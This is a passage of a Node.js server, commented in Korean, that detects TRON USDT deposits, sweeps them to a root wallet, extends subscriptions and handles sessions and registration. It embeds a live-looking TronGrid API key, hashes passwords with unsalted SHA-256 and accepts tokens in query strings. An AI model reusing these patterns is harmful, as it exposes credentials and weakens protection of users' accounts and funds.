    const sendResult = await tronRoot.trx.sendTransaction(depositAddress, TronWeb.toSun(trxNeeded));
    console.log(`[AUTO-SWEEP] TRX 전송 txID: ${sendResult?.txid || sendResult?.transaction?.txID || JSON.stringify(sendResult).slice(0,80)}`);

    // 5. TRX 실제 도착 확인 (최대 90초 = 6초 × 15회)
    // — 단순 시간 대기 대신 잔액 폴링으로 안전하게 확인
    const TRX_CHECK_INTERVAL = 6000;
    const TRX_CHECK_MAX = 15;
    let trxConfirmed = false;
    for (let i = 0; i < TRX_CHECK_MAX; i++) {
      await new Promise(r => setTimeout(r, TRX_CHECK_INTERVAL));
      try {
        const chkResp = await axios.get(
          `https://api.trongrid.io/v1/accounts/${depositAddress}`,
          { headers: { 'TRON-PRO-API-KEY': TRON_KEY }, timeout: 8000 }
        );
        const depTrxBal = (chkResp.data?.data?.[0]?.balance || 0) / 1e6;
        console.log(`[AUTO-SWEEP] TRX 도착 확인 ${i + 1}/${TRX_CHECK_MAX}: ${depTrxBal} TRX`);
        if (depTrxBal >= 1) { trxConfirmed = true; break; }
      } catch (_) { /* 일시적 오류 무시 */ }
    }
    if (!trxConfirmed) {
      console.error('[AUTO-SWEEP] ❌ TRX 미착금 (90초 초과) — 다음 크론에서 재시도');
      return; // paid 상태 유지 → 다음 크론에서 재시도
    }

    // 6. 입금 주소로 USDT sweep
    const tronDeposit = new TronWeb({ fullHost: TRON_FULL_HOST, privateKey: depositPrivKey });
    const contract = await tronDeposit.contract().at(USDT_CONTRACT);
    const balanceRaw = await contract.balanceOf(depositAddress).call();
    const sweepAmount = Number(balanceRaw) / 1e6;

    if (sweepAmount < 0.1) {
      console.warn(`[AUTO-SWEEP] USDT 부족: ${sweepAmount} — 스킵`); return;
    }

    const txId = await contract.transfer(rootAddress, Number(balanceRaw)).send({ feeLimit: 40_000_000 });
    await db.depositAddressDB.updateStatus(depositAddress, 'swept');
    // txId가 객체/undefined/null 일 수 있으므로 항상 string으로 추출
    const txIdStr = String(txId?.txid || txId?.transaction?.txID || (typeof txId === 'string' ? txId : '') || 'unknown');
    console.log(`[AUTO-SWEEP] ✅ 스윕 완료 ${sweepAmount} USDT → ${rootAddress} | txId=${txIdStr}`);

    // 7. 구독 일수 계산 & 연장
    const days = await calcDaysFromUsdt(usdtBalance);
    const newExpiry = await db.userDB.extendSubscription(userId, days);
    const newExpiryDate = newExpiry instanceof Date ? newExpiry : new Date(newExpiry);
    console.log(`[AUTO-SWEEP] ✅ 구독 ${days}일 연장 → user=${userId} 만료=${newExpiryDate.toISOString()}`);

    // 7-b. 총판 정산 자동 계산
    if (managerId) {
      try {
        const [[mgr]] = await db.pool.query('SELECT settlement_rate FROM managers WHERE id = ?', [managerId]);
        const rate = Number(mgr?.settlement_rate) || 0;
        if (rate > 0) {
          const settlementAmount = sweepAmount * rate / 100;
          const [[{ cnt }]] = await db.pool.query(
            'SELECT COUNT(*) as cnt FROM settlements WHERE user_id = ?', [userId]
          );
          const paymentType = Number(cnt) > 0 ? 'renewal' : 'new';
          await db.pool.query(
            `INSERT INTO settlements (manager_id, user_id, payment_amount, settlement_rate, settlement_amount, payment_type)
             VALUES (?, ?, ?, ?, ?, ?)`,
            [managerId, userId, sweepAmount, rate, settlementAmount, paymentType]
          );
          console.log(`[AUTO-SWEEP] ✅ 정산 적립 managerId=${managerId} rate=${rate}% amount=${settlementAmount.toFixed(4)} USDT`);
        }
      } catch (e) {
        console.error('[AUTO-SWEEP] 정산 계산 오류:', e.message);
      }
    }

    // 날짜를 locale 없이 안전하게 포맷 (서버 locale 무관)
    const expiryStr = `${newExpiryDate.getFullYear()}-${String(newExpiryDate.getMonth()+1).padStart(2,'0')}-${String(newExpiryDate.getDate()).padStart(2,'0')}`;
    const nowStr = new Date().toISOString().slice(0, 19).replace('T', ' ');

    // 8. 텔레그램 알림 (매니저 + 마스터) — 입금 감지와 동일한 HTML 모드
    const msg =
      `✅ <b>입금 처리 완료!</b>\n\n` +
      `👤 유저: <code>${escapeHtml(userId)}</code>\n` +
      `💵 금액: <b>${sweepAmount.toFixed(2)} USDT</b>\n` +
      `📅 지급: <b>${days}일</b> (만료: ${escapeHtml(expiryStr)})\n` +
      `🏦 수금: <code>${escapeHtml(rootAddress)}</code>\n` +
      `🔗 TxID: <code>${escapeHtml(txIdStr.slice(0, 30))}</code>\n` +
      `🕐 ${escapeHtml(nowStr)} UTC`;

    console.log(`[AUTO-SWEEP] 텔레그램 전송 시도 managerId=${managerId} masterChatId=${(await getMasterTelegram()).chatId}`);

    if (managerId) {
      const [[mgr]] = await db.pool.query('SELECT tg_bot_token, tg_chat_id FROM managers WHERE id = ?', [managerId]);
      if (mgr?.tg_bot_token && mgr?.tg_chat_id) {
        console.log(`[AUTO-SWEEP] 매니저 봇 전송: chatId=${mgr.tg_chat_id}`);
        await sendTelegram(mgr.tg_bot_token, mgr.tg_chat_id, msg);
      }
    }
    const masterTg = await getMasterTelegram();
    if (masterTg.botToken && masterTg.chatId) {
      console.log(`[AUTO-SWEEP] 마스터 봇 전송: chatId=${masterTg.chatId}`);
      await sendTelegram(masterTg.botToken, masterTg.chatId, msg);
    } else {
      console.warn('[AUTO-SWEEP] 마스터 봇 미설정 — 전송 스킵');
    }

  } catch (e) {
    console.error('[AUTO-SWEEP] 오류:', e.message || e);
  }
}

// ---------- 벌크 결제 스윕 + 일괄 만료일 설정 ----------
async function autoSweepAndBulkGrant(session) {
  console.log(`[BULK-SWEEP] 시작: id=${session.id} total=${session.total_usdt} USDT`);
  try {
    const activeWallet = await db.collectionWalletDB.getActive();
    if (!activeWallet?.xpub_key) { console.warn('[BULK-SWEEP] 활성 지갑/니모닉 없음'); return; }
    const rootAddress = activeWallet.root_wallet_address;

    let rootPrivKey, depositPrivKey;
    try { rootPrivKey = deriveRootPrivateKey(activeWallet.xpub_key); }
    catch (e) { console.error('[BULK-SWEEP] 루트키 파생 실패:', e.message); return; }
    try { depositPrivKey = deriveTronPrivateKey(activeWallet.xpub_key, session.derivation_index); }
    catch (e) { console.error('[BULK-SWEEP] 입금주소키 파생 실패:', e.message); return; }

    const { TronWeb } = require('tronweb');
    const TRON_KEY = process.env.TRONGRID_API_KEY || 'c2b82453-208b-4607-9222-896e921990cb';
    const tronRoot = new TronWeb({ fullHost: TRON_FULL_HOST, privateKey: rootPrivKey });
    if (tronRoot.defaultAddress.base58 !== rootAddress) {
      console.error('[BULK-SWEEP] 루트 주소 불일치'); return;
    }

    // 실잔액 확인
    let depositUsdt = 0;
    try {
      const r = await axios.get(`https://api.trongrid.io/v1/accounts/${session.deposit_address}`,
        { headers: { 'TRON-PRO-API-KEY': TRON_KEY }, timeout: 10000 });
      const trc20 = r.data?.data?.[0]?.trc20 || [];
      const e = trc20.find(b => Object.keys(b)[0]?.toLowerCase() === USDT_CONTRACT.toLowerCase());
      depositUsdt = e ? Number(Object.values(e)[0]) / 1e6 : 0;
    } catch (_) {}
    if (depositUsdt < 0.1) {
      await db.pool.query(`UPDATE bulk_payment_sessions SET status='complete' WHERE id=?`, [session.id]);
      return;
    }

    // TRX 가스비 송금 (기존과 동일)
    let rootTrxBal = 0;
    try {
      const r = await axios.get(`https://api.trongrid.io/v1/accounts/${rootAddress}`,
        { headers: { 'TRON-PRO-API-KEY': TRON_KEY }, timeout: 10000 });
      rootTrxBal = (r.data?.data?.[0]?.balance || 0) / 1e6;
    } catch (_) {}
    if (rootTrxBal >= 2) {
      await tronRoot.trx.sendTransaction(session.deposit_address, Math.floor(2 * 1e6));
      console.log(`[BULK-SWEEP] TRX 2개 → ${session.deposit_address}`);
    }
    // TRX 도착 대기 (최대 90초)
    const TRX_CHECK_MAX = 9; const TRX_CHECK_INTERVAL = 10000;
    for (let i = 0; i < TRX_CHECK_MAX; i++) {
      await new Promise(r => setTimeout(r, TRX_CHECK_INTERVAL));
      try {
        const r = await axios.get(`https://api.trongrid.io/v1/accounts/${session.deposit_address}`,
          { headers: { 'TRON-PRO-API-KEY': TRON_KEY }, timeout: 8000 });
        if ((r.data?.data?.[0]?.balance || 0) / 1e6 >= 1) break;
      } catch (_) {}
    }

    // USDT sweep
    const tronDep = new TronWeb({ fullHost: TRON_FULL_HOST, privateKey: depositPrivKey });
    const contract = await tronDep.contract().at(USDT_CONTRACT);
    const balRaw = await contract.balanceOf(session.deposit_address).call();
    const sweepAmt = Number(balRaw) / 1e6;
    if (sweepAmt < 0.1) { await db.pool.query(`UPDATE bulk_payment_sessions SET status='complete' WHERE id=?`, [session.id]); return; }
    await contract.transfer(rootAddress, Number(balRaw)).send({ feeLimit: 40_000_000 });
    console.log(`[BULK-SWEEP] ✅ ${sweepAmt} USDT → ${rootAddress}`);

    // 일괄 만료일 설정
    const entries = JSON.parse(session.entries || '[]');
    const targetDate = session.target_date instanceof Date
      ? session.target_date
      : new Date(session.target_date + 'T00:00:00');
    const tgtStr = `${targetDate.getFullYear()}-${String(targetDate.getMonth()+1).padStart(2,'0')}-${String(targetDate.getDate()).padStart(2,'0')}`;
    for (const e of entries) {
      if (!e.userId || !(e.days > 0)) continue;
      await db.pool.query(
        `UPDATE users SET expire_date = ?, status = 'approved' WHERE id = ?`,
        [tgtStr, e.userId.toLowerCase()]
      );
      console.log(`[BULK-SWEEP] ✅ ${e.userId} 만료일 → ${tgtStr}`);
    }

    await db.pool.query(`UPDATE bulk_payment_sessions SET status='complete' WHERE id=?`, [session.id]);
    console.log(`[BULK-SWEEP] ✅ 완료 id=${session.id}`);

    // 텔레그램 알림 (마스터)
    try {
      const masterTg = await getMasterTelegram();
      if (masterTg.botToken && masterTg.chatId) {
        const userList = entries.filter(e => e.days > 0).map(e => `<code>${escapeHtml(String(e.userId))}</code>`).join(', ');
        await sendTelegram(masterTg.botToken, masterTg.chatId,
          `✅ <b>벌크 입금 처리 완료!</b>\n💵 ${sweepAmt.toFixed(2)} USDT\n📅 만료일 → ${tgtStr}\n👥 ${userList}`);
      }
    } catch (_) {}
  } catch (e) {
    console.error('[BULK-SWEEP] 오류:', e.message);
  }
}

// ---------- 입금 감지 크론잡 ----------
// TronGrid 무료 쿼터: 100,000건/일 → 안전 예산 90,000건
// 1,440분/일 → 분당 최대 62건 처리 (90,000 / 1,440 = 62.5)
// 150ms 딜레이 × 62건 ≈ 9.3초/분 실행 → 1분 이내 완료
const TRONGRID_DAILY_BUDGET = Number(process.env.TRONGRID_DAILY_BUDGET) || 90000;
const CRON_MINUTES_PER_DAY = 1440;
const PER_RUN_LIMIT = Math.floor(TRONGRID_DAILY_BUDGET / CRON_MINUTES_PER_DAY); // 62
const REQUEST_DELAY_MS = 150; // 초당 ~6건, TronGrid 초당 한도(15건) 이내

const ADDRESS_EXPIRE_HOURS = 1; // 입금 없는 주소 만료 시간

let _depositCheckRunning = false;

cron.schedule('* * * * *', async () => {
  if (_depositCheckRunning) return; // 이전 실행이 아직 끝나지 않은 경우 skip
  _depositCheckRunning = true;
  try {
    // ── 1시간 초과 미결제 주소 만료 처리 ──
    const [expireResult] = await db.pool.query(
      `UPDATE deposit_addresses
          SET status = 'expired'
        WHERE status IN ('issued', 'waiting_deposit')
          AND created_at < DATE_SUB(NOW(), INTERVAL ? HOUR)`,
      [ADDRESS_EXPIRE_HOURS]
    );
    if (expireResult.affectedRows > 0) {
      console.log(`[DEPOSIT-CHECK] ⏰ 만료 처리: ${expireResult.affectedRows}개 주소 → expired`);
    }

    const [addresses] = await db.pool.query(
      `SELECT da.deposit_address, da.user_id, u.manager_id, da.status
       FROM deposit_addresses da
       JOIN users u ON da.user_id = u.id
       WHERE da.status IN ('issued', 'waiting_deposit', 'expired', 'paid')
       ORDER BY da.created_at ASC
       LIMIT ?`,
      [PER_RUN_LIMIT]
    );
    if (addresses.length === 0) return;

    console.log(`[DEPOSIT-CHECK] 이번 분 처리: ${addresses.length}개 (한도 ${PER_RUN_LIMIT}/분, 예산 ${TRONGRID_DAILY_BUDGET}/일)`);

    const tronGridHeaders = { 'TRON-PRO-API-KEY': process.env.TRONGRID_API_KEY || 'c2b82453-208b-4607-9222-896e921990cb' };

    // 마스터 알림봇은 크론 실행당 한 번만 조회
    const masterTg = await getMasterTelegram();

    for (const addr of addresses) {
      try {
        // /v1/accounts/{addr}/transactions/trc20 로 USDT 입금 이력 직접 확인
        // (account 엔드포인트의 trc20 필드가 누락되는 경우가 있어 더 신뢰성 높음)
        const txResp = await axios.get(
          `https://api.trongrid.io/v1/accounts/${addr.deposit_address}/transactions/trc20`,
          {
            params: { contract_address: USDT_CONTRACT, only_confirmed: true, limit: 20 },
            timeout: 10000,
            headers: tronGridHeaders,
          }
        );

        const txList = txResp.data?.data || [];

        // ── 실제 현재 USDT 잔액 조회 (거래 내역 합산 방식은 스윕 후에도 양수로 남아 무한루프 발생) ──
        let actualUsdtBalance = 0;
        try {
          const acctResp = await axios.get(
            `https://api.trongrid.io/v1/accounts/${addr.deposit_address}`,
            { headers: tronGridHeaders, params: { only_confirmed: true }, timeout: 10000 }
          );
          const trc20List = acctResp.data?.data?.[0]?.trc20 || [];
          const usdtEntry = trc20List.find(b => {
            const key = Object.keys(b)[0];
            return key && key.toLowerCase() === USDT_CONTRACT.toLowerCase();
          });
          actualUsdtBalance = usdtEntry ? Number(Object.values(usdtEntry)[0]) / 1e6 : 0;
        } catch (e) {
          console.warn(`[DEPOSIT-CHECK] 실잔액 조회 실패 (${addr.deposit_address}):`, e.message);
        }

        // 실잔액 0 + 트랜잭션 없음 → 미입금 상태로 전환
        if (txList.length === 0 && actualUsdtBalance < 0.01) {
          await db.pool.query(
            `UPDATE deposit_addresses SET status = 'waiting_deposit'
             WHERE deposit_address = ? AND status = 'issued'`,
            [addr.deposit_address]
          );
          await new Promise(r => setTimeout(r, REQUEST_DELAY_MS));
          continue;
        }

        // 실잔액 0이지만 트랜잭션 기록이 남아 있는 경우 → 이미 스윕됨, DB 정리
        if (actualUsdtBalance < 0.01 && addr.status === 'paid') {
          console.log(`[DEPOSIT-CHECK] 주소 ${addr.deposit_address} 실잔액 0 (이미 스윕 완료) → swept 처리`);
          await db.depositAddressDB.updateStatus(addr.deposit_address, 'swept');
          await new Promise(r => setTimeout(r, REQUEST_DELAY_MS));
          continue;
        }

        const usdtBalance = actualUsdtBalance > 0.01 ? actualUsdtBalance
          : txList.filter(tx => tx.to === addr.deposit_address && tx.type === 'Transfer')
                  .reduce((sum, tx) => sum + Number(tx.value) / 1e6, 0);

        if (usdtBalance > 0) {
          const alreadyPaid = addr.status === 'paid';

          if (!alreadyPaid) {
            // 최초 감지 → 상태 변경 + 텔레그램 알림
            await db.depositAddressDB.updateStatus(addr.deposit_address, 'paid');
            console.log(`[DEPOSIT-CHECK] ✅ 입금 확인 userId=${addr.user_id} ${usdtBalance} USDT`);

            const msg =
              `💰 <b>입금 감지!</b>\n\n` +
              `👤 유저: <code>${escapeHtml(addr.user_id)}</code>\n` +
              (addr.manager_id ? `🧑‍💼 매니저: <code>${escapeHtml(addr.manager_id)}</code>\n` : '') +
              `💵 금액: <b>${usdtBalance.toFixed(2)} USDT</b>\n` +
              `📬 주소: <code>${escapeHtml(addr.deposit_address)}</code>\n` +
              `🕐 시각: ${escapeHtml(new Date().toLocaleString('ko-KR'))}`;

            if (addr.manager_id) {
              const [[mgr]] = await db.pool.query(
                'SELECT tg_bot_token, tg_chat_id FROM managers WHERE id = ?',
                [addr.manager_id]
              );
              if (mgr?.tg_bot_token && mgr?.tg_chat_id) {
                await sendTelegram(mgr.tg_bot_token, mgr.tg_chat_id, msg);
              }
            }
            if (masterTg.botToken && masterTg.chatId) {
              await sendTelegram(masterTg.botToken, masterTg.chatId, msg);
            }
          } else {
            // 이미 paid — 스윕 재시도 중
            console.log(`[DEPOSIT-CHECK] 🔄 스윕 재시도 userId=${addr.user_id} ${usdtBalance} USDT`);
          }

          // 자동 스윕 & 구독 부여 (fire-and-forget, 스윕 실패 시 다음 크론에 재시도)
          autoSweepAndGrant(addr.deposit_address, addr.user_id, addr.manager_id, usdtBalance)
            .catch(e => console.error('[AUTO-SWEEP] 예외:', e.message));
        }
      } catch (e) {
        console.error(`[DEPOSIT-CHECK] ${addr.deposit_address} 오류:`, e.message);
      }
      await new Promise(r => setTimeout(r, REQUEST_DELAY_MS));
    }
    // ── 벌크 결제 세션 체크 ──
    try {
      // 1시간 초과 pending 세션 만료
      await db.pool.query(
        `UPDATE bulk_payment_sessions SET status='expired'
         WHERE status='pending' AND created_at < DATE_SUB(NOW(), INTERVAL 1 HOUR)`
      );
      // pending 세션 목록 (최대 10개)
      const [bulkList] = await db.pool.query(
        `SELECT * FROM bulk_payment_sessions WHERE status='pending' AND deposit_address IS NOT NULL LIMIT 10`
      );
      for (const sess of bulkList) {
        try {
          // TronGrid로 입금 주소 USDT 잔액 확인
          const TRON_KEY = process.env.TRONGRID_API_KEY || 'c2b82453-208b-4607-9222-896e921990cb';
          const resp = await axios.get(
            `https://api.trongrid.io/v1/accounts/${sess.deposit_address}`,
            { headers: { 'TRON-PRO-API-KEY': TRON_KEY }, timeout: 8000 }
          );
          const trc20 = resp.data?.data?.[0]?.trc20 || [];
          const entry = trc20.find(b => {
            const k = Object.keys(b)[0];
            return k && k.toLowerCase() === USDT_CONTRACT.toLowerCase();
          });
          const bal = entry ? Number(Object.values(entry)[0]) / 1e6 : 0;
          if (bal >= Number(sess.total_usdt) * 0.98) { // 2% 오차 허용
            console.log(`[BULK-SWEEP] 입금 감지 token=${sess.id} bal=${bal} required=${sess.total_usdt}`);
            await db.pool.query(`UPDATE bulk_payment_sessions SET status='paid' WHERE id=?`, [sess.id]);
            autoSweepAndBulkGrant(sess).catch(e => console.error('[BULK-SWEEP] 오류:', e.message));
          }
        } catch (e) { console.warn(`[BULK-CHECK] ${sess.id} 오류:`, e.message); }
        await new Promise(r => setTimeout(r, REQUEST_DELAY_MS));
      }
    } catch (e) { console.error('[BULK-CHECK] 크론 오류:', e.message); }
  } catch (e) {
    console.error('[DEPOSIT-CHECK] 크론잡 오류:', e.message);
  } finally {
    _depositCheckRunning = false;
  }
});

// ---------- 클라이언트용 세션 저장소 (DB 기반) ----------
// 슬라이딩 세션: 검증할 때마다 만료 시간 연장 (기본 24시간)
const SESSION_TIMEOUT = 24 * 60 * 60 * 1000; // 24시간 (밀리초)

const sessionStore = {
  // DB 기반 세션 저장
  async save(userId, newToken) {
    try {
      // 기존 세션 확인
      const [existingSessions] = await db.pool.query(
        'SELECT token FROM sessions WHERE user_id = ?',
        [userId]
      );
      
      const hadOldSession = existingSessions.length > 0;
      
      // 기존 세션 삭제 후 새 세션 저장
      await db.pool.query('DELETE FROM sessions WHERE user_id = ?', [userId]);
      await db.pool.query(
        'INSERT INTO sessions (user_id, token, last_activity) VALUES (?, ?, NOW())',
        [userId, newToken]
      );
      
      return hadOldSession; // 기존 세션이 있었는지 반환
    } catch (error) {
      console.error('세션 저장 오류:', error);
      return false;
    }
  },
  
  async isValid(token) {
    try {
      const [rows] = await db.pool.query(
        'SELECT user_id, last_activity, kicked FROM sessions WHERE token = ?',
        [token]
      );
      
      if (rows.length === 0) return false;
      
      const session = rows[0];
      
      // kicked 상태 확인
      if (session.kicked) return false;
      
      // 타임아웃 확인 (24시간)
      const lastActivity = new Date(session.last_activity).getTime();
      const now = Date.now();
      
      if (now - lastActivity > SESSION_TIMEOUT) {
        // 세션 만료 - 삭제
        await this.remove(session.user_id);
        return false;
      }
      
      // 슬라이딩 세션: 활동 시간 갱신
      await db.pool.query(
        'UPDATE sessions SET last_activity = NOW() WHERE token = ?',
        [token]
      );
      
      return true;
    } catch (error) {
      console.error('세션 검증 오류:', error);
      return false;
    }
  },
  
  async getUserId(token) {
    try {
      const [rows] = await db.pool.query(
        'SELECT user_id, last_activity FROM sessions WHERE token = ? AND kicked = FALSE',
        [token]
      );
      
      if (rows.length === 0) return null;
      
      const session = rows[0];
      
      // 타임아웃 확인
      const lastActivity = new Date(session.last_activity).getTime();
      if (Date.now() - lastActivity > SESSION_TIMEOUT) {
        await this.remove(session.user_id);
        return null;
      }
      
      // 슬라이딩: 조회할 때마다 갱신
      await db.pool.query(
        'UPDATE sessions SET last_activity = NOW() WHERE token = ?',
        [token]
      );
      
      return session.user_id;
    } catch (error) {
      console.error('사용자 ID 조회 오류:', error);
      return null;
    }
  },
  
  async remove(userId) {
    try {
      await db.pool.query('DELETE FROM sessions WHERE user_id = ?', [userId]);
    } catch (error) {
      console.error('세션 삭제 오류:', error);
    }
  },
  
  async kickUser(userId) {
    try {
      await db.pool.query(
        'UPDATE sessions SET kicked = TRUE WHERE user_id = ?',
        [userId]
      );
      // 세션 끊기 시 채굴 상태도 stopped로 즉시 반영
      await db.pool.query(
        `INSERT INTO miner_status (user_id, status, assigned_at)
         VALUES (?, 'stopped', NULL)
         ON DUPLICATE KEY UPDATE status = 'stopped', assigned_at = NULL`,
        [userId]
      );
    } catch (error) {
      console.error('세션 킥 오류:', error);
    }
  },
  
  async getAll() {
    try {
      const now = Date.now();
      const [rows] = await db.pool.query(
        'SELECT user_id, token, last_activity FROM sessions WHERE kicked = FALSE'
      );
      
      const result = [];
      const expiredUsers = [];
      
      for (const row of rows) {
        const lastActivity = new Date(row.last_activity).getTime();
        if (now - lastActivity > SESSION_TIMEOUT) {
          expiredUsers.push(row.user_id);
        } else {
          result.push({ userId: row.user_id, token: row.token });
        }
      }
      
      // 만료된 세션 삭제
      if (expiredUsers.length > 0) {
        await db.pool.query(
          'DELETE FROM sessions WHERE user_id IN (?)',
          [expiredUsers]
        );
      }
      
      return result;
    } catch (error) {
      console.error('세션 목록 조회 오류:', error);
      return [];
    }
  }
};

// ---------- 관리자 세션: token -> { role: 'master'|'manager', id } ----------
// ─── 팝업 이미지 업로드 (multer) ───
const _uploadDir = path.join(__dirname, 'public', 'uploads', 'popups');
if (!fs.existsSync(_uploadDir)) fs.mkdirSync(_uploadDir, { recursive: true });
const _popupStorage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, _uploadDir),
  filename:    (req, file, cb) => {
    const ext = path.extname(file.originalname) || '.jpg';
    cb(null, Date.now() + '_' + crypto.randomBytes(6).toString('hex') + ext);
  },
});
const _uploadPopup = multer({
  storage: _popupStorage,
  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB
  fileFilter: (req, file, cb) => {
    if (/^image\//.test(file.mimetype)) cb(null, true);
    else cb(new Error('이미지 파일만 업로드 가능합니다.'));
  },
});

const adminSessions = new Map();
function createAdminToken() {
  return crypto.randomBytes(24).toString('hex');
}
function requireAdmin(req, res, next) {
  const token = req.headers.authorization?.replace(/^Bearer\s+/i, '') || req.query?.adminToken || '';
  const session = adminSessions.get(token);
  if (!session) {
    return res.status(401).json({ error: '로그인이 필요합니다.' });
  }
  req.admin = session;
  next();
}
function requireMaster(req, res, next) {
  if (req.admin?.role !== 'master') {
    return res.status(403).json({ error: '마스터만 가능합니다.' });
  }
  next();
}

// 클라이언트(회원) 세션 인증 미들웨어
async function requireSession(req, res, next) {
  const token = req.headers.authorization?.replace(/^Bearer\s+/i, '') || req.query?.token || req.body?.token || '';
  if (!token) return res.status(401).json({ error: '로그인이 필요합니다.' });
  const userId = await sessionStore.getUserId(token);
  if (!userId) return res.status(401).json({ error: '세션이 만료되었습니다.' });
  req.userId = userId;
  req.sessionToken = token;
  next();
}

// 그룹 오너 세션 인증 미들웨어
async function requireOwnerSession(req, res, next) {
  const token = req.headers.authorization?.replace(/^Bearer\s+/i, '') || req.query?.token || req.body?.token || '';
  if (!token) return res.status(401).json({ error: '로그인이 필요합니다.' });
  try {
    const [[session]] = await db.pool.query(
      `SELECT s.owner_id, s.last_activity, o.name, o.telegram, o.manager_id
       FROM owner_sessions s JOIN account_owners o ON s.owner_id = o.id
       WHERE s.token = ?`,
      [token]
    );
    if (!session) return res.status(401).json({ error: '세션이 만료되었습니다.' });
    const lastActivity = new Date(session.last_activity).getTime();
    if (Date.now() - lastActivity > 24 * 60 * 60 * 1000) {
      await db.pool.query('DELETE FROM owner_sessions WHERE token = ?', [token]);
      return res.status(401).json({ error: '세션이 만료되었습니다.' });
    }
    await db.pool.query('UPDATE owner_sessions SET last_activity = NOW() WHERE token = ?', [token]);
    req.owner = { id: session.owner_id, name: session.name, telegram: session.telegram, managerId: session.manager_id };
    next();
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
}

// ===== macroUser 인증 헬퍼 =====
function muHashPassword(pw) {
  return crypto.createHash('sha256').update(pw).digest('hex');
}
function muCreateToken() {
  return crypto.randomBytes(24).toString('hex');
}
async function requireMuAuth(req, res, next) {
  const token = req.headers.authorization?.replace(/^Bearer\s+/i, '') || req.query?.muToken || '';
  if (!token) return res.status(401).json({ error: '로그인이 필요합니다.' });
  try {
    const [[session]] = await db.pool.query(
      `SELECT s.token, s.last_activity, u.id, u.name, u.login_id, u.role, u.status
       FROM mu_sessions s JOIN mu_users u ON s.user_id = u.id WHERE s.token = ?`, [token]
    );
    if (!session) return res.status(401).json({ error: '세션이 만료되었습니다.' });
    if (session.status !== 'active') return res.status(403).json({ error: '비활성 계정입니다.' });
    const lastActivity = new Date(session.last_activity).getTime();
    if (Date.now() - lastActivity > 24 * 60 * 60 * 1000) {
      await db.pool.query('DELETE FROM mu_sessions WHERE token = ?', [token]);
      return res.status(401).json({ error: '세션이 만료되었습니다. 다시 로그인하세요.' });
    }
    await db.pool.query('UPDATE mu_sessions SET last_activity = NOW() WHERE token = ?', [token]);
    req.muUser = { id: session.id, name: session.name, loginId: session.login_id, role: session.role };
    next();
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
}
function requireMuAdmin(req, res, next) {
  if (req.muUser?.role !== 'ADMIN') return res.status(403).json({ error: '관리자 권한이 필요합니다.' });
  next();
}

// ---------- 미들웨어 ----------
app.use(cors());
app.use(express.json());

// API 요청 로깅 미들웨어
// 아래 경로는 로그 생략 (앱이 주기적으로 호출해 노이즈가 큼)
const SILENT_PATHS = [
  '/api/session/validate',
  '/api/seed',
  '/api/seed/history',
  '/api/user/subscription',
];
app.use('/api', (req, res, next) => {
  const isSilent = SILENT_PATHS.some(p => req.path === p || req.path.startsWith(p + '?'));
  if (isSilent) return next();

  const start = Date.now();
  const timestamp = new Date().toLocaleString('ko-KR');
  
  res.on('finish', () => {
    const duration = Date.now() - start;
    const logData = {
      timestamp,
      method: req.method,
      url: req.originalUrl,
      status: res.statusCode,
      duration: `${duration}ms`,
      ip: req.ip || req.connection.remoteAddress,
    };
    
    if ((req.method === 'POST' || req.method === 'PUT') && req.body) {
      const sanitizedBody = { ...req.body };
      if (sanitizedBody.password) sanitizedBody.password = '***';
      if (sanitizedBody.pw) sanitizedBody.pw = '***';
      if (sanitizedBody.phrase) sanitizedBody.phrase = '***';
      logData.body = sanitizedBody;
    }
    
    if (res.statusCode >= 500) {
      console.error('❌ API 에러:', JSON.stringify(logData));
    } else if (res.statusCode >= 400) {
      console.warn('⚠️  API 경고:', JSON.stringify(logData));
    } else {
      console.log('✅ API:', req.method, req.path, res.statusCode, `${Date.now() - start}ms`);
    }
  });
  
  next();
});

app.use(express.static(path.join(__dirname, 'public')));

// ---------- 클라이언트 API ----------

// 회원가입 API (추천인 코드 필수)
app.post('/api/register', async (req, res) => {
  try {
    const { id, password, referralCode, telegram } = req.body || {};
    
    if (!id?.trim() || !password?.trim() || !referralCode?.trim()) {
      return res.status(400).json({ error: '아이디, 비밀번호, 추천인 코드를 입력하세요.' });
    }
    
    // 추천인 확인 (manager 또는 master 모두 허용)
    const manager = await db.managerDB.get(referralCode.trim());
    if (!manager) {
      // managers 테이블에 없으면 admins 테이블(master)에서 확인
      const [[masterRow]] = await db.pool.query(
        "SELECT id, tg_bot_token, tg_chat_id FROM admins WHERE id=? AND role='master'",
        [referralCode.trim()]
      );
      if (!masterRow) return res.status(400).json({ error: '유효하지 않은 추천인 코드입니다.' });
      // master를 referral로 쓸 경우 manager 객체처럼 사용
      Object.assign(masterRow, { tg_bot_token: masterRow.tg_bot_token, tg_chat_id: masterRow.tg_chat_id });
      Object.assign(manager || {}, masterRow);
      // manager가 null이므로 아래 알림은 masterRow로 처리
      await db.userDB.addOrUpdate(id.trim(), password.trim(), referralCode.trim(), telegram || '', 'pending');
      try {
        if (masterRow.tg_bot_token && masterRow.tg_chat_id) {
          await sendTelegram(masterRow.tg_bot_token, masterRow.tg_chat_id,
            `📩 <b>신규 가입 요청</b>\n아이디: <code>${id.trim()}</code>\n텔레그램: ${telegram?.trim() || '-'}\n추천인: ${referralCode.trim()}`);
        }
      } catch (_) {}
      return res.json({ success: true, message: '회원가입이 완료되었습니다. 관리자 승인을 기다려주세요.', managerId: referralCode.trim() });
    }
    
    // 기존 사용자 확인
    const existing = await db.userDB.get(id.trim());
    if (existing) {
      return res.status(400).json({ error: '이미 존재하는 아이디입니다.' });
    }
    
    // 사용자 생성 (승인 대기 상태)
    await db.userDB.addOrUpdate(id.trim(), password.trim(), referralCode.trim(), telegram || '', 'pending');

    // 해당 총판(매니저)에게 텔레그램 알림 발송
    try {
      if (manager.tg_bot_token && manager.tg_chat_id) {
        await sendTelegram(
          manager.tg_bot_token,
          manager.tg_chat_id,
          `📩 <b>신규 가입 요청</b>\n아이디: <code>${id.trim()}</code>\n텔레그램: ${telegram ? telegram.trim() : '-'}\n추천인: ${referralCode.trim()}`
        );
      }
    } catch (tgErr) {
      console.warn('가입 알림 텔레그램 전송 실패:', tgErr.message);
    }

    res.json({ 
      success: true, 
      message: '회원가입이 완료되었습니다. 관리자 승인을 기다려주세요.',
      managerId: referralCode.trim()
    });
  } catch (error) {
    console.error('회원가입 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// 로그인 API (승인 및 사용기간 검증)
app.post('/api/login', async (req, res) => {
  try {
    const { id, password } = req.body || {};
